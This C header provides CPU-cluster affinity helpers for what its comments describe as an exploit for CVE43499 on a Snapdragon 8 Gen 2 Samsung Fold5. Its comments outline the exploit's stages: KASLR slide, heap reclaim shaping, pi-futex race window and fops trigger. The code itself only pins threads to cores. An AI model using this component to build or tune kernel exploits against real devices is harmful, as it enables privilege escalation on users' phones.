/*
 * CPU-cluster affinity for SM8550-class (Snapdragon 8 Gen 2) targets.
 *
 * Topology on the Fold5 (SM-F946B, 5.15.189):
 *   cpu0-2  Cortex-A510 LITTLE   max 2016 MHz
 *   cpu3-6  Cortex-A715/A710 big max 2803 MHz
 *   cpu7    Cortex-X3 prime      max 3360 MHz
 *
 * Policy: the time-sensitive exploit choreography (KASLR slide, reclaim
 * shaping, pi-futex window, fops trigger) runs pinned to the X3 prime
 * core; its consumer/waiter counterpart threads run pinned to the big
 * perf cluster (never the prime core, never the little cores); long-lived
 * background actors (stability keeper) get the whole perf mask so walt
 * can place them anywhere fast. Nothing is ever deliberately scheduled
 * onto the little cluster by this code anymore.
 *
 * The layout is detected at runtime from cpufreq and falls back to the
 * known SM8550 map when sysfs is unreadable. RMG_TIMING_CORE /
 * RMG_CONSUMER_CORE override individual picks, RMG_NO_AFFINITY=1 disables
 * all pinning (diagnostics only).
 */
#ifndef CVE43499_AFFINITY_H
#define CVE43499_AFFINITY_H

#include <ctype.h>
#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>

#define AFFINITY_MAX_CPUS 32

struct affinity_layout {
  int detected;
  int timing_core;                       /* Cortex-X3 prime core          */
  int consumer_core;                     /* first perf-cluster core       */
  int waiter_core;                       /* second perf core (or same)    */
  cpu_set_t perf_mask;                   /* perf cluster, excl. prime     */
};

static struct affinity_layout affinity_layout;

static inline void affinity_detect(void) {
  if (affinity_layout.detected) {
    return;
  }
  /* Fallback: known SM8550 map. */
  int fallback_freq[AFFINITY_MAX_CPUS] = {0};
  for (int c = 0; c < AFFINITY_MAX_CPUS; c++) {
    fallback_freq[c] = -1;
  }
  fallback_freq[0] = fallback_freq[1] = fallback_freq[2] = 2016000;
  fallback_freq[3] = fallback_freq[4] = fallback_freq[5] = fallback_freq[6] =
      2803200;
  fallback_freq[7] = 3360000;

  int freq[AFFINITY_MAX_CPUS];
  int max_cpu = -1;
  for (int c = 0; c < AFFINITY_MAX_CPUS; c++) {
    char path[96];
    snprintf(path, sizeof(path),
             "/sys/devices/system/cpu/cpu%d/cpufreq/cpuinfo_max_freq", c);
    FILE *f = fopen(path, "r");
    freq[c] = -1;
    if (f) {
      int v = -1;
      if (fscanf(f, "%d", &v) == 1 && v > 0) {
        freq[c] = v;
        if (c > max_cpu) {
          max_cpu = c;
        }
      }
      fclose(f);
    }
  }
  if (max_cpu < 1) {
    for (int c = 0; c < AFFINITY_MAX_CPUS; c++) {
      freq[c] = fallback_freq[c];
      if (fallback_freq[c] > 0 && c > max_cpu) {
        max_cpu = c;
      }
    }
  }

  int top_freq = 0, second_freq = 0;
  for (int c = 0; c <= max_cpu; c++) {
    if (freq[c] > top_freq) {
      second_freq = top_freq;
      top_freq = freq[c];
    } else if (freq[c] < top_freq && freq[c] > second_freq) {
      second_freq = freq[c];
    }
  }
  int timing = -1;
  CPU_ZERO(&affinity_layout.perf_mask);
  int perf_list[AFFINITY_MAX_CPUS];
  int perf_n = 0;
  for (int c = 0; c <= max_cpu; c++) {
    if (freq[c] == top_freq && timing < 0) {
      timing = c;
    } else if (freq[c] == second_freq || freq[c] == top_freq) {
      CPU_SET(c, &affinity_layout.perf_mask);
      perf_list[perf_n++] = c;
    }
  }
  if (timing < 0 || perf_n == 0) {
    /* Degenerate read: use the static map wholesale. */
    timing = 7;
    CPU_ZERO(&affinity_layout.perf_mask);
    perf_n = 0;
    for (int c = 3; c <= 6; c++) {
      CPU_SET(c, &affinity_layout.perf_mask);
      perf_list[perf_n++] = c;
    }
  }
  affinity_layout.timing_core = timing;
  const char *env = getenv("RMG_NO_AFFINITY");
  if (env && env[0] == '1') {
    affinity_layout.consumer_core = timing;
    affinity_layout.waiter_core = timing;
    CPU_ZERO(&affinity_layout.perf_mask);
    CPU_SET(timing, &affinity_layout.perf_mask);
  } else {
    env = getenv("RMG_CONSUMER_CORE");
    affinity_layout.consumer_core =
        env ? atoi(env) : perf_list[0];
    env = getenv("RMG_TIMING_CORE");
    if (env) {
      affinity_layout.timing_core = atoi(env);
    }
    affinity_layout.waiter_core =
        perf_n > 1 ? perf_list[1] : affinity_layout.consumer_core;
  }
  if (affinity_layout.waiter_core < 0) {
    affinity_layout.waiter_core = affinity_layout.consumer_core;
  }
  if (affinity_layout.consumer_core < 0) {
    affinity_layout.consumer_core = affinity_layout.timing_core;
  }
  affinity_layout.detected = 1;
}

static inline int affinity_timing_core(void) {
  affinity_detect();
  return affinity_layout.timing_core;
}

static inline int affinity_consumer_core(void) {
  affinity_detect();
  return affinity_layout.consumer_core;
}

static inline int affinity_waiter_core(void) {
  affinity_detect();
  return affinity_layout.waiter_core;
}

/* Whole perf-cluster mask for background actors ("rest of it"). */
static inline void pin_perf_mask(void) {
  affinity_detect();
  sched_setaffinity(0, sizeof(cpu_set_t), &affinity_layout.perf_mask);
}

/* One-line summary of the resolved mapping for exploit logs. */
static inline void affinity_describe(char *out, size_t out_len) {
  affinity_detect();
  char perf[128];
  perf[0] = '\0';
  size_t off = 0;
  for (int c = 0; c < AFFINITY_MAX_CPUS && off < sizeof(perf) - 8; c++) {
    if (CPU_ISSET(c, &affinity_layout.perf_mask)) {
      off += (size_t)snprintf(perf + off, sizeof(perf) - off, "%s%d",
                              off ? "," : "", c);
    }
  }
  snprintf(out, out_len, "prime=%d perf=[%s] timing->%d consumer->%d",
           affinity_layout.timing_core, perf, affinity_layout.timing_core,
           affinity_layout.consumer_core);
}

#endif
